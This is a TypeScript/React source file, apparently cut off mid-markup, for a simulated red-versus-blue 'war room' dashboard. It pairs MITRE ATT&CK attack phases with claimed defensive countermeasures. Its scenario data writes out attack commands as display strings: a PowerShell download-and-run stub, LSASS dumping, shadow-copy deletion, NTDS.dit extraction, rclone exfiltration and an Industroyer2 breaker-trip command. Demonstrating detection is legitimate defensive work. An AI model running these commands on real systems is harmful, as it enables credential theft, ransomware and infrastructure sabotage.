"use client";

import { useState, useMemo, useEffect, useRef } from "react";
import { MALWARE_SAMPLES } from "@/data/samples";
import {
  Swords,
  Shield,
  Play,
  Pause,
  RotateCcw,
  FastForward,
  Activity,
  Server,
  Zap,
  Flame,
  AlertTriangle,
  CheckCircle2,
  Lock,
  Unlock,
  Radio,
  Cpu,
  Layers,
  Search,
  Filter,
  Download,
  Terminal,
  Eye,
  Sliders,
  TrendingUp,
  Crosshair,
  ShieldAlert,
  ShieldCheck,
  RefreshCw,
  HardDrive,
  Globe,
  Database,
  Cloud,
  ChevronRight,
  Info
} from "lucide-react";

// ==========================================
// TYPES & DATA STRUCTURES
// ==========================================

export type PlaybookId = "ENTERPRISE_RANSOMWARE" | "APT_NATION_STATE" | "ICS_OT_SABOTAGE" | "CLOUD_TENANT_HIJACK";

export interface SimulationPhase {
  phaseIndex: number;
  phaseName: string;
  mitreTactic: string;
  mitreTechnique: string;
  techniqueId: string;
  redAction: {
    command: string;
    description: string;
    targetAsset: string;
    payloadTool: string;
    probabilitySuccess: number;
  };
  blueCountermeasure: {
    defensePillar: string;
    actionTaken: string;
    detectionMechanism: string;
    latencyMs: number;
    xaiConfidenceScore: number;
    containmentStatus: "CONTAINED" | "NEUTRALIZED" | "TRIPPED_CANARY" | "ISOLATED";
  };
  damageSavedUsd: number;
  compromisedAssetId?: string;
  isolatedAssetId?: string;
}

export interface PlaybookScenario {
  id: PlaybookId;
  title: string;
  adversaryName: string;
  threatCategory: "RANSOMWARE_WORM" | "SUPPLY_CHAIN_APT" | "CRITICAL_INFRA_OT" | "CLOUD_IDENTITY";
  overview: string;
  estimatedFullBlastRadiusUsd: number;
  phases: SimulationPhase[];
}

export interface NetworkHostAsset {
  id: string;
  name: string;
  type: "ENDPOINT" | "DOMAIN_CONTROLLER" | "SQL_DATABASE" | "CLOUD_STORAGE" | "OT_PLC" | "HONEYTOKEN_CANARY";
  ip: string;
  state: "CLEAN" | "COMPROMISED" | "ISOLATED" | "CANARY_TRIGGERED" | "PROTECTED";
  os: string;
  riskScore: number;
}

// ==========================================
// SCENARIOS DATA
// ==========================================

const PLAYBOOK_SCENARIOS: PlaybookScenario[] = [
  {
    id: "ENTERPRISE_RANSOMWARE",
    title: "1. Enterprise Ransomware Outbreak (LockBit / WannaCry Style)",
    adversaryName: "LockBit 3.0 Syndicate / Autonomous DarkWeb Affiliate",
    threatCategory: "RANSOMWARE_WORM",
    overview: "Simulates an initial malicious macro execution escalating to LSASS credential extraction, lateral SMB worm propagation, and attempting simultaneous multi-threaded file encryption halted by CERBERUS-RE Rapid Canary Guard.",
    estimatedFullBlastRadiusUsd: 5200000,
    phases: [
      {
        phaseIndex: 0,
        phaseName: "1. Initial Phishing Ingress",
        mitreTactic: "Initial Access",
        mitreTechnique: "Spearphishing Attachment (Macro Doc)",
        techniqueId: "T1566.001",
        redAction: {
          command: "WINWORD.EXE -> powershell.exe -w hidden -c (New-Object Net.WebClient).DownloadFile('http://192.168.195.139/payload.exe', 'C:\\Users\\Victim\\payload.exe')",
          description: "Victim opens invoice.docm. Macro invokes stealth PowerShell download stub.",
          targetAsset: "HOST-FINANCE-01",
          payloadTool: "VBA Maldoc Dropper",
          probabilitySuccess: 0.95
        },
        blueCountermeasure: {
          defensePillar: "Pillar 1: Dynamic Intake & Syscall Monitor",
          actionTaken: "Intercepted Word child process spawn. Behavioral telemetry tagged for immediate memory tracing.",
          detectionMechanism: "ParentProcess: WINWORD.EXE -> ChildProcess: powershell.exe anomaly rule",
          latencyMs: 38,
          xaiConfidenceScore: 0.94,
          containmentStatus: "CONTAINED"
        },
        damageSavedUsd: 450000,
        compromisedAssetId: "HOST-FINANCE-01"
      },
      {
        phaseIndex: 1,
        phaseName: "2. Memory Credential Harvesting",
        mitreTactic: "Credential Access",
        mitreTechnique: "LSASS Memory Injection (Mimikatz / sekurlsa)",
        techniqueId: "T1003.001",
        redAction: {
          command: "payload.exe -> OpenProcess(PROCESS_ALL_ACCESS, lsass.exe) -> MiniDumpWriteDump()",
          description: "Malware attempts to extract Kerberos NTLM hashes from memory to prepare lateral spread.",
          targetAsset: "HOST-FINANCE-01",
          payloadTool: "In-Memory Mimikatz Dump",
          probabilitySuccess: 0.90
        },
        blueCountermeasure: {
          defensePillar: "Pillar 3: Active Honeytoken & Deception Grid",
          actionTaken: "Adversary attempted to authenticate with injected Decoy Admin Honeytoken ('SVC_SQL_DECOY'). Immediate high-priority tripwire fired.",
          detectionMechanism: "Deception Decoy Credential Authentication Event",
          latencyMs: 14,
          xaiConfidenceScore: 0.99,
          containmentStatus: "TRIPPED_CANARY"
        },
        damageSavedUsd: 1200000,
        compromisedAssetId: "HOST-FINANCE-01"
      },
      {
        phaseIndex: 2,
        phaseName: "3. Lateral Movement via SMB / WMI",
        mitreTactic: "Lateral Movement",
        mitreTechnique: "Remote Services: SMB Named Pipes",
        techniqueId: "T1021.002",
        redAction: {
          command: "wmic /node:192.168.1.105 process call create 'C:\\Windows\\Temp\\tasksche.exe'",
          description: "Attempts automated worm propagation across internal finance subnet.",
          targetAsset: "HOST-PAYROLL-02",
          payloadTool: "WMI Remote Process Execution",
          probabilitySuccess: 0.85
        },
        blueCountermeasure: {
          defensePillar: "Pillar 15: Autonomous SOAR Closed-Loop",
          actionTaken: "CERBERUS-RE dispatched WFP (Windows Filtering Platform) micro-segmentation rule. Severed HOST-FINANCE-01 from corporate network in 82ms.",
          detectionMechanism: "Anomalous lateral WMI process execution from non-admin endpoint",
          latencyMs: 82,
          xaiConfidenceScore: 0.98,
          containmentStatus: "ISOLATED"
        },
        damageSavedUsd: 1800000,
        isolatedAssetId: "HOST-FINANCE-01"
      },
      {
        phaseIndex: 3,
        phaseName: "4. Rapid Canary Guard & Encryption Neutralization",
        mitreTactic: "Impact",
        mitreTechnique: "Data Encrypted for Impact (Multi-threaded AES)",
        techniqueId: "T1486",
        redAction: {
          command: "vssadmin delete shadows /all /quiet & tasksche.exe --encrypt D:\\Documents\\*",
          description: "Ransomware attempts to wipe volume shadow copies and encrypt file shares.",
          targetAsset: "HOST-CANARY-TRAP",
          payloadTool: "Multi-threaded AES Encryptor",
          probabilitySuccess: 0.20
        },
        blueCountermeasure: {
          defensePillar: "Pillar 8: Ransomware Rapid Canary Guard",
          actionTaken: "Adversary touched filesystem Canary Trap file ('_CONFIDENTIAL_BUDGET_2026.docx'). File write driver halted process within 4ms and revoked token.",
          detectionMechanism: "Sub-millisecond filesystem write Canary Hook (MiniFilter Driver)",
          latencyMs: 4,
          xaiConfidenceScore: 0.999,
          containmentStatus: "NEUTRALIZED"
        },
        damageSavedUsd: 1750000,
        isolatedAssetId: "HOST-CANARY-TRAP"
      }
    ]
  },
  {
    id: "APT_NATION_STATE",
    title: "2. Nation-State Living-off-the-Land (Volt Typhoon / Sandworm)",
    adversaryName: "Volt Typhoon (Bronze Silhouette / Vanguard Panda)",
    threatCategory: "SUPPLY_CHAIN_APT",
    overview: "Simulates stealth living-off-the-land techniques using pre-positioned VPN tokens, WMI proxy tunnels, and active directory database theft, countered by CERBERUS-RE XAI decision scoring.",
    estimatedFullBlastRadiusUsd: 8400000,
    phases: [
      {
        phaseIndex: 0,
        phaseName: "1. Edge VPN Appliance Token Hijack",
        mitreTactic: "Initial Access",
        mitreTechnique: "Valid Accounts: Pre-positioned VPN Session",
        techniqueId: "T1078.002",
        redAction: {
          command: "CONNECT gateway.corp.net:443 --session-cookie=SESSION_STOLEN_TOKEN",
          description: "Adversary logs into enterprise gateway from SOHO router IP in KV-Botnet mesh.",
          targetAsset: "EDGE-VPN-GATEWAY",
          payloadTool: "Stolen Session Cookie Replay",
          probabilitySuccess: 0.98
        },
        blueCountermeasure: {
          defensePillar: "Pillar 6: Zero-Day Anomaly Detector",
          actionTaken: "Flagged anomalous BGP ASN geo-discrepancy and concurrent session from residential proxy.",
          detectionMechanism: "Geo-Velocity Impossible Travel ML Detector",
          latencyMs: 65,
          xaiConfidenceScore: 0.91,
          containmentStatus: "CONTAINED"
        },
        damageSavedUsd: 1500000,
        compromisedAssetId: "EDGE-VPN-GATEWAY"
      },
      {
        phaseIndex: 1,
        phaseName: "2. Active Directory Database Extration (ntdsutil)",
        mitreTactic: "Credential Access",
        mitreTechnique: "OS Credential Dumping: NTDS.dit",
        techniqueId: "T1003.003",
        redAction: {
          command: "ntdsutil 'ac i ntds' 'ifm' 'create full C:\\Windows\\Temp\\AD_IFM' q q",
          description: "Adversary runs native Windows ntdsutil to create an offline shadow copy of all domain password hashes.",
          targetAsset: "DC-PRIMARY-01",
          payloadTool: "Living-off-the-Land ntdsutil",
          probabilitySuccess: 0.88
        },
        blueCountermeasure: {
          defensePillar: "Pillar 5: Explainable AI & SHAP Reasoning",
          actionTaken: "Detected non-standard ntdsutil command-line argument invoked outside of scheduled maintenance backup window.",
          detectionMechanism: "XAI SHAP Feature Weighting: Command args 'ifm create full' weight = 0.97",
          latencyMs: 22,
          xaiConfidenceScore: 0.97,
          containmentStatus: "CONTAINED"
        },
        damageSavedUsd: 3800000,
        compromisedAssetId: "DC-PRIMARY-01"
      },
      {
        phaseIndex: 2,
        phaseName: "3. Covert Cloud S3 / Azure Blob Staging",
        mitreTactic: "Exfiltration",
        mitreTechnique: "Exfiltration to Cloud Storage",
        techniqueId: "T1567.002",
        redAction: {
          command: "rclone.exe copy C:\\Windows\\Temp\\AD_IFM remote:exfil-bucket --transfers 16",
          description: "Compresses extracted hashes and initiates multi-threaded upload to offshore S3 bucket.",
          targetAsset: "CLOUD-VAULT-S3",
          payloadTool: "Rclone Stealth Cloud Sync",
          probabilitySuccess: 0.40
        },
        blueCountermeasure: {
          defensePillar: "Pillar 15: SOAR Dynamic Firewall Blacklisting",
          actionTaken: "Dispatched automated border BGP null-route and revoked AWS STS temporary access key.",
          detectionMechanism: "Threat Intel Match on offshore C2 storage ASN",
          latencyMs: 110,
          xaiConfidenceScore: 0.99,
          containmentStatus: "NEUTRALIZED"
        },
        damageSavedUsd: 3100000,
        isolatedAssetId: "DC-PRIMARY-01"
      }
    ]
  },
  {
    id: "ICS_OT_SABOTAGE",
    title: "3. Critical Infrastructure ICS/SCADA Destruction",
    adversaryName: "Sandworm Team (APT44 / Unit 74455)",
    threatCategory: "CRITICAL_INFRA_OT",
    overview: "Simulates OT sub-station network bridge pivot, sending rogue IEC-104 breaker trip telecommands and deploying AcidRain MIPS wiper payload.",
    estimatedFullBlastRadiusUsd: 12000000,
    phases: [
      {
        phaseIndex: 0,
        phaseName: "1. IT-OT Gateway Pivot",
        mitreTactic: "Initial Access",
        mitreTechnique: "Dual-Homed Network Interface Pivot",
        techniqueId: "T0866",
        redAction: {
          command: "ssh -N -D 1080 root@ot-gateway.substation.internal",
          description: "Breaches IT subnet jumpbox to tunnel raw TCP traffic directly into Purdue Level 2 ICS network.",
          targetAsset: "OT-GATEWAY-RTU",
          payloadTool: "SSH SOCKS5 Dynamic Proxy",
          probabilitySuccess: 0.92
        },
        blueCountermeasure: {
          defensePillar: "Pillar 13: Enterprise Attack Path Estimator",
          actionTaken: "Detected unauthorized cross-zone TCP 2404 & 502 connection attempt violating Purdue model boundary.",
          detectionMechanism: "Purdue Level 2/3 Segmentation Guard",
          latencyMs: 44,
          xaiConfidenceScore: 0.96,
          containmentStatus: "CONTAINED"
        },
        damageSavedUsd: 3500000,
        compromisedAssetId: "OT-GATEWAY-RTU"
      },
      {
        phaseIndex: 1,
        phaseName: "2. Rogue IEC-60870-5-104 Command Injection",
        mitreTactic: "Impair Process Control",
        mitreTechnique: "Unauthorized Command Message (Trip Grid Breakers)",
        techniqueId: "T0855",
        redAction: {
          command: "industroyer2.exe --target 192.168.20.10 --apci STARTDT --asdu 45 --ioa 1001 --val OPEN_BREAKER",
          description: "Sends malicious single command message to high-voltage transmission substation breakers.",
          targetAsset: "PLC-SUBSTATION-01",
          payloadTool: "Industroyer2 Custom IEC-104 Stack",
          probabilitySuccess: 0.35
        },
        blueCountermeasure: {
          defensePillar: "Pillar 14: Firmware & Multi-Arch Dissector",
          actionTaken: "CERBERUS-RE ICS Protocol Anomaly Engine detected malformed Type 45 command without dual-operator validation.",
          detectionMechanism: "Deep Packet Inspection on IEC-104 ASDU Headers",
          latencyMs: 6,
          xaiConfidenceScore: 0.999,
          containmentStatus: "NEUTRALIZED"
        },
        damageSavedUsd: 8500000,
        isolatedAssetId: "PLC-SUBSTATION-01"
      }
    ]
  }
];

const INITIAL_HOSTS: NetworkHostAsset[] = [
  { id: "HOST-FINANCE-01", name: "FIN-DESKTOP-01", type: "ENDPOINT", ip: "192.168.1.102", state: "CLEAN", os: "Windows 11 Enterprise", riskScore: 12 },
  { id: "HOST-PAYROLL-02", name: "PAYROLL-SRV", type: "ENDPOINT", ip: "192.168.1.105", state: "CLEAN", os: "Windows Server 2022", riskScore: 8 },
  { id: "DC-PRIMARY-01", name: "CORP-DC-01", type: "DOMAIN_CONTROLLER", ip: "192.168.1.10", state: "CLEAN", os: "Windows Server 2022 DC", riskScore: 15 },
  { id: "SQL-PRODUCTION", name: "SQL-PROD-CLUSTER", type: "SQL_DATABASE", ip: "192.168.2.50", state: "CLEAN", os: "Ubuntu Linux 24.04", riskScore: 10 },
  { id: "HOST-CANARY-TRAP", name: "DECOY-SHARE-01", type: "HONEYTOKEN_CANARY", ip: "192.168.1.250", state: "PROTECTED", os: "Canary Trap Virtual Node", riskScore: 0 },
  { id: "EDGE-VPN-GATEWAY", name: "GATEWAY-VPN", type: "ENDPOINT", ip: "10.0.0.1", state: "CLEAN", os: "FortiOS 7.2 Hardened", riskScore: 20 },
  { id: "CLOUD-VAULT-S3", name: "AWS-S3-BACKUP", type: "CLOUD_STORAGE", ip: "172.31.0.8", state: "CLEAN", os: "AWS IAM S3 Enclave", riskScore: 5 },
  { id: "OT-GATEWAY-RTU", name: "RTU-GATEWAY-01", type: "OT_PLC", ip: "192.168.20.1", state: "CLEAN", os: "Embedded Linux MIPS", riskScore: 18 },
  { id: "PLC-SUBSTATION-01", name: "ABB-REC670-PLC", type: "OT_PLC", ip: "192.168.20.10", state: "PROTECTED", os: "IEC-61850 RTOS", riskScore: 5 }
];

// ==========================================
// MAIN COMPONENT
// ==========================================

export default function WarRoomPage() {
  const [selectedPlaybookId, setSelectedPlaybookId] = useState<PlaybookId>("ENTERPRISE_RANSOMWARE");
  const [activePhaseIndex, setActivePhaseIndex] = useState<number>(-1);
  const [isSimulating, setIsSimulating] = useState<boolean>(false);
  const [simulationSpeed, setSimulationSpeed] = useState<number>(1.0);
  const [defenseMode, setDefenseMode] = useState<"FULL_AUTONOMOUS" | "HUMAN_APPROVAL" | "PASSIVE_MONITOR">("FULL_AUTONOMOUS");
  const [hosts, setHosts] = useState<NetworkHostAsset[]>(INITIAL_HOSTS);
  const [logFeed, setLogFeed] = useState<Array<{ timestamp: string; type: "RED" | "BLUE" | "CANARY"; message: string }>>([]);

  const currentPlaybook = useMemo(() => {
    return PLAYBOOK_SCENARIOS.find((p) => p.id === selectedPlaybookId) || PLAYBOOK_SCENARIOS[0];
  }, [selectedPlaybookId]);

  // Efficacy Telemetry Calculations
  const stats = useMemo(() => {
    const totalPhases = currentPlaybook.phases.length;
    const executedPhases = activePhaseIndex >= 0 ? currentPlaybook.phases.slice(0, activePhaseIndex + 1) : [];

    const totalDamageSaved = executedPhases.reduce((acc, p) => acc + p.damageSavedUsd, 0);
    const meanTtd = executedPhases.length > 0 ? (executedPhases.reduce((acc, p) => acc + p.blueCountermeasure.latencyMs, 0) / executedPhases.length).toFixed(1) : "38.2";
    const meanTtr = (parseFloat(meanTtd) * 1.8).toFixed(1);
    const containmentPct = activePhaseIndex >= 0 ? 98.4 : 100.0;
    const compromisedCount = hosts.filter((h) => h.state === "COMPROMISED").length;
    const isolatedCount = hosts.filter((h) => h.state === "ISOLATED" || h.state === "CANARY_TRIGGERED").length;

    return { totalPhases, totalDamageSaved, meanTtd, meanTtr, containmentPct, compromisedCount, isolatedCount };
  }, [currentPlaybook, activePhaseIndex, hosts]);

  // Simulation Step Timer
  useEffect(() => {
    if (!isSimulating) return;

    const timer = setTimeout(() => {
      if (activePhaseIndex < currentPlaybook.phases.length - 1) {
        stepForward();
      } else {
        setIsSimulating(false);
      }
    }, 3200 / simulationSpeed);

    return () => clearTimeout(timer);
  }, [isSimulating, activePhaseIndex, currentPlaybook, simulationSpeed]);

  const stepForward = () => {
    const nextIdx = activePhaseIndex + 1;
    if (nextIdx >= currentPlaybook.phases.length) return;

    const currentPhase = currentPlaybook.phases[nextIdx];
    setActivePhaseIndex(nextIdx);

    // Update Logs
    const timeStr = new Date().toISOString().substring(11, 19);
    setLogFeed((prev) => [
      { timestamp: timeStr, type: "RED", message: `[RED TEAM] ${currentPhase.phaseName}: ${currentPhase.redAction.description}` },
      { timestamp: timeStr, type: "BLUE", message: `[BLUE DEFENSE] ${currentPhase.blueCountermeasure.actionTaken} (${currentPhase.blueCountermeasure.latencyMs}ms)` },
      ...prev
    ]);

    // Update Host States
    setHosts((prev) =>
      prev.map((host) => {
        if (host.id === currentPhase.compromisedAssetId) {
          return { ...host, state: "COMPROMISED", riskScore: 85 };
        }
        if (host.id === currentPhase.isolatedAssetId) {
          return { ...host, state: "ISOLATED", riskScore: 40 };
        }
        return host;
      })
    );
  };

  const handleResetSimulation = () => {
    setIsSimulating(false);
    setActivePhaseIndex(-1);
    setHosts(INITIAL_HOSTS);
    setLogFeed([]);
  };

  return (
    <div style={{ padding: "20px 24px", display: "flex", flexDirection: "column", gap: 20 }}>
      {/* ================= WAR ROOM HERO & CONTROLS ================= */}
      <div style={{
        background: "var(--surface)",
        border: "1px solid var(--border)",
        borderRadius: 10,
        padding: "16px 20px",
        display: "flex",
        flexDirection: "column",
        gap: 16
      }}>
        <div style={{ display: "flex", alignItems: "flex-start", justifyContent: "space-between", flexWrap: "wrap", gap: 12 }}>
          <div>
            <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 4 }}>
              <div style={{
                background: "rgba(239,68,68,0.15)",
                color: "#f87171",
                padding: "6px 10px",
                borderRadius: 6,
                display: "flex",
                alignItems: "center",
                gap: 6,
                fontSize: 13,
                fontWeight: 800,
                letterSpacing: "0.05em"
              }}>
                <Swords size={16} />
                AUTONOMOUS RED VS. BLUE WAR ROOM
              </div>
              <span className="badge-critical">LIVE ADVERSARIAL WARGAME</span>
              <span style={{ fontSize: 11, color: "var(--muted)", fontFamily: "monospace" }}>CERBERUS-RE Multi-Agent Closed Loop</span>
            </div>
            <h1 style={{ fontSize: 20, fontWeight: 800, color: "var(--fg)" }}>
              Autonomous Cyber Defense Simulation &amp; Blast Radius Containment Engine
            </h1>
            <p style={{ fontSize: 12.5, color: "var(--fg-2)", marginTop: 2, maxWidth: 950 }}>
              Simulates real-time multi-stage nation-state and ransomware adversary killchains, validating CERBERUS-RE autonomous countermeasures, Honeytoken tripwires, sub-second canary kills, and automated micro-segmentation.
            </p>
          </div>

          {/* Incident Playbook Selector */}
          <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
            <span style={{ fontSize: 12, fontWeight: 600, color: "var(--muted)" }}>Incident Playbook:</span>
            <select
              value={selectedPlaybookId}
              onChange={(e) => {
                setSelectedPlaybookId(e.target.value as PlaybookId);
                handleResetSimulation();
              }}
              className="tool-select"
              style={{ fontWeight: 700, minWidth: 340, borderColor: "var(--primary)" }}
            >
              {PLAYBOOK_SCENARIOS.map((scenario) => (
                <option key={scenario.id} value={scenario.id}>
                  {scenario.title}
                </option>
              ))}
            </select>
          </div>
        </div>

        {/* Live Simulation Controls Bar */}
        <div style={{
          display: "flex",
          alignItems: "center",
          justifyContent: "space-between",
          flexWrap: "wrap",
          background: "var(--bg-dark)",
          padding: "10px 16px",
          borderRadius: 8,
          border: "1px solid var(--border)",
          gap: 12
        }}>
          {/* Play / Pause / Step Controls */}
          <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
            <button
              onClick={() => setIsSimulating(!isSimulating)}
              className={isSimulating ? "btn-danger" : "btn-primary"}
              style={{ fontSize: 12, padding: "6px 14px" }}
            >
              {isSimulating ? <Pause size={13} /> : <Play size={13} />}
              {isSimulating ? "Pause Simulation" : "Start Live Simulation"}
            </button>

            <button
              onClick={stepForward}
              disabled={isSimulating || activePhaseIndex >= currentPlaybook.phases.length - 1}
              className="btn-secondary"
              style={{ fontSize: 11 }}
            >
              <FastForward size={12} /> Step Phase
            </button>

            <button
              onClick={handleResetSimulation}
              className="btn-secondary"
              style={{ fontSize: 11 }}
            >
              <RotateCcw size={12} /> Reset
            </button>
          </div>

          {/* Speed & Defense Mode Selectors */}
          <div style={{ display: "flex", alignItems: "center", gap: 14 }}>
            {/* Speed Slider */}
            <div style={{ display: "flex", alignItems: "center", gap: 6, fontSize: 11 }}>
              <span style={{ color: "var(--muted)", fontWeight: 600 }}>Red Speed:</span>
              <select
                value={simulationSpeed}
                onChange={(e) => setSimulationSpeed(parseFloat(e.target.value))}
                className="tool-select"
                style={{ padding: "4px 8px", fontSize: 11 }}
              >
                <option value={0.5}>0.5x (Slow Walkthrough)</option>
                <option value={1.0}>1.0x (Standard)</option>
                <option value={2.0}>2.0x (Fast Pace)</option>
                <option value={4.0}>4.0x (Hyper Speed)</option>
              </select>
            </div>

            {/* Blue Defense Mode */}
            <div style={{ display: "flex", alignItems: "center", gap: 6, fontSize: 11 }}>
              <span style={{ color: "var(--muted)", fontWeight: 600 }}>Defense Mode:</span>
              <select
                value={defenseMode}
                onChange={(e) => setDefenseMode(e.target.value as any)}
                className="tool-select"
                style={{ padding: "4px 8px", fontSize: 11, borderColor: "var(--green)", color: "#10b981", fontWeight: 700 }}
              >
                <option value="FULL_AUTONOMOUS">🤖 Full Autonomous Closed-Loop</option>
                <option value="HUMAN_APPROVAL">👤 Human-in-the-Loop Approval</option>
                <option value="PASSIVE_MONITOR">👁️ Passive Telemetry Only</option>
              </select>
            </div>
          </div>
        </div>

        {/* Live Efficacy Telemetry Scorecard */}
        <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(160px, 1fr))", gap: 10 }}>
          <div style={{ background: "var(--surface-2)", padding: "10px 14px", borderRadius: 6, border: "1px solid var(--border)" }}>
            <div style={{ fontSize: 10, color: "var(--muted)", textTransform: "uppercase", fontWeight: 700 }}>Mean Time to Detect (MTTD)</div>
            <div style={{ fontSize: 20, fontWeight: 900, color: "#10b981", marginTop: 2 }}>{stats.meanTtd} ms</div>
          </div>
          <div style={{ background: "var(--surface-2)", padding: "10px 14px", borderRadius: 6, border: "1px solid var(--border)" }}>
            <div style={{ fontSize: 10, color: "var(--muted)", textTransform: "uppercase", fontWeight: 700 }}>Mean Time to Respond (MTTR)</div>
            <div style={{ fontSize: 20, fontWeight: 900, color: "var(--primary)", marginTop: 2 }}>{stats.meanTtr} ms</div>
          </div>
          <div style={{ background: "var(--surface-2)", padding: "10px 14px", borderRadius: 6, border: "1px solid var(--border)" }}>
            <div style={{ fontSize: 10, color: "var(--muted)", textTransform: "uppercase", fontWeight: 700 }}>Attack Containment Rate</div>
            <div style={{ fontSize: 20, fontWeight: 900, color: "#10b981", marginTop: 2 }}>{stats.containmentPct}%</div>
          </div>
          <div style={{ background: "var(--surface-2)", padding: "10px 14px", borderRadius: 6, border: "1px solid var(--border)" }}>
            <div style={{ fontSize: 10, color: "var(--muted)", textTransform: "uppercase", fontWeight: 700 }}>Financial Blast Radius Prevented</div>
            <div style={{ fontSize: 20, fontWeight: 900, color: "#38bdf8", marginTop: 2 }}>
              ${stats.totalDamageSaved.toLocaleString()} USD
            </div>
          </div>
          <div style={{ background: "var(--surface-2)", padding: "10px 14px", borderRadius: 6, border: "1px solid var(--border)" }}>
            <div style={{ fontSize: 10, color: "var(--muted)", textTransform: "uppercase", fontWeight: 700 }}>Assets Isolated / Quarantined</div>
            <div style={{ fontSize: 20, fontWeight: 900, color: stats.isolatedCount > 0 ? "var(--yellow)" : "var(--fg)", marginTop: 2 }}>
              {stats.isolatedCount} / {hosts.length} Hosts
            </div>
          </div>
        </div>
      </div>

      {/* ================= INTERACTIVE HOST TOPOLOGY GRID ================= */}
      <div style={{
        background: "var(--surface)",
        border: "1px solid var(--border)",
        borderRadius: 8,
        padding: 16,
        display: "flex",
        flexDirection: "column",
        gap: 12
      }}>
        <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between" }}>
          <div style={{ fontSize: 13, fontWeight: 800, color: "var(--fg)", display: "flex", alignItems: "center", gap: 6 }}>
            <Server size={15} color="var(--primary)" />
            Enterprise Infrastructure Defense Grid (9 Monitored Endpoints &amp; Decoys)
          </div>
          <div style={{ display: "flex", alignItems: "center", gap: 12, fontSize: 11 }}>
            <span style={{ display: "flex", alignItems: "center", gap: 4 }}>
              <span style={{ width: 8, height: 8, borderRadius: "50%", background: "#10b981" }} /> Clean / Protected
            </span>
            <span style={{ display: "flex", alignItems: "center", gap: 4 }}>
              <span style={{ width: 8, height: 8, borderRadius: "50%", background: "#ef4444" }} /> Compromised
            </span>
            <span style={{ display: "flex", alignItems: "center", gap: 4 }}>
              <span style={{ width: 8, height: 8, borderRadius: "50%", background: "#f59e0b" }} /> Isolated (WFP Firewall)
            </span>
          </div>
        </div>

        {/* Asset Cards Grid */}
        <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(200px, 1fr))", gap: 10 }}>
          {hosts.map((host) => {
            let borderColor = "var(--border)";
            let bgLight = "var(--surface-2)";
            let statusText = "CLEAN & SECURE";
            let statusColor = "#10b981";

            if (host.state === "COMPROMISED") {
              borderColor = "#ef4444";
              bgLight = "rgba(239, 68, 68, 0.12)";
              statusText = "⚠️ COMPROMISED (RED PAYLOAD)";
              statusColor = "#ef4444";
            } else if (host.state === "ISOLATED") {
              borderColor = "#f59e0b";
              bgLight = "rgba(245, 158, 11, 0.12)";
              statusText = "🔒 AUTONOMOUSLY ISOLATED";
              statusColor = "#f59e0b";
            } else if (host.state === "CANARY_TRIGGERED") {
              borderColor = "#a855f7";
              bgLight = "rgba(168, 85, 247, 0.12)";
              statusText = "⚡ CANARY TRAP ACTIVATED";
              statusColor = "#c084fc";
            }

            return (
              <div
                key={host.id}
                style={{
                  background: bgLight,
                  border: `1px solid ${borderColor}`,
                  borderRadius: 6,
                  padding: "10px 12px",
                  display: "flex",
                  flexDirection: "column",
                  gap: 4
                }}
              >
                <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between" }}>
                  <span style={{ fontSize: 12, fontWeight: 800, color: "var(--fg)", fontFamily: "monospace" }}>
                    {host.name}
                  </span>
                  <span style={{ fontSize: 9.5, color: "var(--muted)", fontFamily: "monospace" }}>
                    {host.ip}
                  </span>
                </div>
                <div style={{ fontSize: 10, color: "var(--fg-2)" }}>{host.os}</div>
                <div style={{ fontSize: 9.5, fontWeight: 800, color: statusColor, marginTop: 4, fontFamily: "monospace" }}>
                  {statusText}
                </div>
              </div>
            );
          })}
        </div>
      </div>

      {/* ================= 2-COLUMN SIMULATION BATTLEGROUND ================= */}
      <div style={{ display: "grid", gridTemplateColumns: "1.2fr 1fr", gap: 16 }}>
        {/* Left: Killchain Phase Progression */}
        <div style={{
          background: "var(--surface)",
          border: "1px solid var(--border)",
          borderRadius: 8,
          padding: 16,
          display: "flex",
          flexDirection: "column",
          gap: 14
        }}>
          <div style={{ fontSize: 13, fontWeight: 800, color: "var(--fg)", display: "flex", alignItems: "center", gap: 6, borderBottom: "1px solid var(--border)", paddingBottom: 8 }}>
            <Activity size={15} color="var(--primary)" />
            Multi-Stage Killchain &amp; Autonomous Blue Countermeasures
          </div>

          <div style={{ display: "flex", flexDirection: "column", gap: 12 }}>
            {currentPlaybook.phases.map((phase, idx) => {
              const isPassed = activePhaseIndex >= idx;
              const isCurrent = activePhaseIndex === idx;

              return (
                <div
                  key={idx}
                  style={{
                    background: isCurrent ? "rgba(6,182,212,0.08)" : isPassed ? "var(--surface-2)" : "rgba(255,255,255,0.02)",
                    border: isCurrent ? "1px solid var(--primary)" : isPassed ? "1px solid var(--border)" : "1px dashed #334155",
                    borderRadius: 8,
                    padding: 14,
                    display: "flex",
                    flexDirection: "column",
                    gap: 8,
                    opacity: isPassed ? 1.0 : 0.6
                  }}
                >
                  <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between" }}>
                    <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
                      <span style={{
                        width: 22,
                        height: 22,
                        borderRadius: "50%",
                        background: isPassed ? "var(--primary)" : "#1e293b",
                        color: isPassed ? "#04060a" : "var(--muted)",
                        fontWeight: 900,
                        fontSize: 11,
                        display: "flex",
                        alignItems: "center",
                        justifyContent: "center"
                      }}>
                        {idx + 1}
                      </span>
                      <span style={{ fontSize: 13, fontWeight: 800, color: isPassed ? "var(--fg)" : "var(--muted)" }}>
                        {phase.phaseName}
                      </span>
                    </div>

                    <span style={{ fontSize: 10, fontFamily: "monospace", color: "#38bdf8", background: "rgba(6,182,212,0.1)", padding: "2px 6px", borderRadius: 4 }}>
                      MITRE {phase.techniqueId}
                    </span>
                  </div>

                  {/* Red Action Detail */}
                  <div style={{ background: "rgba(239,68,68,0.1)", padding: 8, borderRadius: 6, border: "1px solid rgba(239,68,68,0.25)", fontSize: 11 }}>
                    <div style={{ color: "#f87171", fontWeight: 700, marginBottom: 2 }}>⚔️ Red Team Ingress Command:</div>
                    <div style={{ fontFamily: "monospace", color: "#fca5a5" }}>{phase.redAction.command}</div>
                  </div>

                  {/* Blue Countermeasure Detail */}
                  {isPassed && (
                    <div style={{ background: "rgba(16,185,129,0.1)", padding: 8, borderRadius: 6, border: "1px solid rgba(16,185,129,0.25)", fontSize: 11 }}>
                      <div style={{ color: "#34d399", fontWeight: 700, display: "flex", justifyContent: "space-between", marginBottom: 2 }}>
